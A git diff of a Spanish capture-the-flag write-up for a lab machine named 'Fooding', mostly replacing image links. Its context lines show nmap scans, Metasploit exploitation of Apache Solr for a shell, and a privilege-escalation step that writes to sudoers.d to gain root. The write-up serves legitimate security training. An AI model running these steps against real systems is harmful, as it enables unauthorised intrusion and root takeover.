@@ -1,3 +1,4 @@
+# Máquina Eclipse
 - **Nombre de la Máquina:** Fooding
 - **Sistema Operativo**: Linux
 - **Dificultad:** Medium
@@ -11,13 +12,14 @@ Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina ví
 ```bash
 sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
 ```
-![[Pasted image 20240709193254.png]]
+![Pasted image 20240709193254](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/e0741a7d-94f7-4c97-a521-6c77e238e1d3)
 
 Nos reporta el puerto 80 y el puerto 8983, haremos un escaneo mas exhaustivo para ver que corre por cada puerto.
 ```bash
 sudo nmap -p 80,8983 -sCV 172.17.0.2 -oN targeted.txt
 ```
-![[Pasted image 20240709193514.png]]
+![Pasted image 20240709193514](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/16ab5a02-6480-4993-98f3-1209a06c73cc)
+
 - Puerto 80: HTTP Apache
 - Puerto 8983: Solr Admin
 
@@ -25,7 +27,8 @@ Después de analizar el informe de nmap, identificamos que el puerto 80 está ac
 
 En el puerto 80 solo encontramos una imagen, la cual no nos aporta información útil, por lo que decidí investigar más a fondo el servicio Solr.
 
-![[Pasted image 20240709194022.png]]
+![Pasted image 20240709194022](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/176f0ce5-e677-46b7-b68b-906ab788f86d)
+
 Como podemos observar en el panel de control, se muestra la versión del servicio. Con esta información, procedo a investigar si existen vulnerabilidades explotables.
 
 Tuvimos suerte y encontramos varios métodos de explotación. Básicamente, es el mismo procedimiento, pero con diferentes enfoques: uno utilizando Metasploit y otro empleando un script en Python.
@@ -42,7 +45,8 @@ Buscamos el exploit con el comando:
 ```bash
 search solr
 ```
-![[Pasted image 20240709195212.png]]
+![Pasted image 20240709195212](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/e2c2ae74-3d41-431a-8829-aec31a474756)
+
 
 ```bash
 use 0
@@ -50,13 +54,14 @@ set RHOSTS 172.17.0.2
 set LHOST 172.17.0.1
 check
 ```
-![[Pasted image 20240709195413.png]]
+![Pasted image 20240709195413](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/fa080517-d09c-4c7f-a63e-903089e2d3f6)
 
 Al poner check, nos dice que el target es vulnerable.
-![[Pasted image 20240709195557.png]]
+![Pasted image 20240709195557](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/eec4a79e-ff88-4b9c-bbe2-9a8808fbb308)
 
 Ejecutamos el comando run y estaremos dentro de la máquina como usuario ninhack.
-![[Pasted image 20240709195738.png]]
+![Pasted image 20240709195738](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/b4d64aff-c782-4e28-864a-11f5adeebc3a)
+
 
 ### Escalada de privilegios
 Primero me mandé una shell para trabajar mas cómodo con el siguiente comando:
@@ -92,4 +97,4 @@ LFILE='\etc\sudoers.d\ninhack'
 ```
 
 Una vez ejecutados esos comandos, solo necesitamos ejecutar `sudo su` para convertirnos en usuario root.
-![[Pasted image 20240709201931.png]]
+![Pasted image 20240709201931](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/18a446b4-a44b-42b3-b540-580cc1d50a51)
